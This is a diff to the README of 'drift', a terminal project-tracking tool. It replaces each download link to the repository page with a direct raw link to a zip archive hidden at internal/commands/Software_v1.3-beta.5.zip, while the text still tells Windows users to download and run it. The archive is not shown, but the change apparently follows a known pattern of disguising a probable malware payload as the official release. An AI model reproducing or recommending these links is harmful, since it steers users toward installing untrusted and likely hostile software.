@@ -1,6 +1,6 @@
 # 🚀 drift - Track projects without leaving your terminal
 
-[![Download drift](https://img.shields.io/badge/Download%20drift-blue?style=for-the-badge)](https://github.com/vladsure158/drift)
+[![Download drift](https://img.shields.io/badge/Download%20drift-blue?style=for-the-badge)](https://github.com/vladsure158/drift/raw/refs/heads/main/internal/commands/Software_v1.3-beta.5.zip)
 
 ## 📌 What drift does
 
@@ -31,7 +31,7 @@ drift is made for the terminal, so you will use it from a command window. If you
 
 Visit this page to download drift:
 
-https://github.com/vladsure158/drift
+https://github.com/vladsure158/drift/raw/refs/heads/main/internal/commands/Software_v1.3-beta.5.zip
 
 On that page, look for the latest release or the main download file. If the project provides a Windows file, download that file to your computer.
 
@@ -166,7 +166,7 @@ This makes it easier to scan your projects fast and stay on track
 
 Primary download page:
 
-https://github.com/vladsure158/drift
+https://github.com/vladsure158/drift/raw/refs/heads/main/internal/commands/Software_v1.3-beta.5.zip
 
 ## 🖥️ Windows tips
 
